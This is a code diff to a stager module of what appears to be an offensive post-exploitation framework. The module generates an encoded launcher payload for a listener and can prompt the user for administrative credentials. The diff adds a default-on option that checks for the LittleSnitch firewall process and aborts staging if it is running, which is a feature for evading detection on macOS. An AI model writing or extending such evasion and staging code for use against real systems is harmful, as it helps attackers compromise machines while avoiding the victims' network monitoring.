@@ -31,6 +31,11 @@ class Stager:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'LittleSnitch' : {
+                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
+                'Required'      :   True,
+                'Value'         :   'True'
+            },
             'AdminPrompt' : {
                 'Description'   :   'Switch. Prompt the user for administrative credentials when launching.',
                 'Required'      :   False,
@@ -71,9 +76,10 @@ class Stager:
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         adminPrompt = self.options['AdminPrompt']['Value']
+        LittleSnitch = self.options['LittleSnitch']['Value']
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds,littlesnitch=LittleSnitch)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
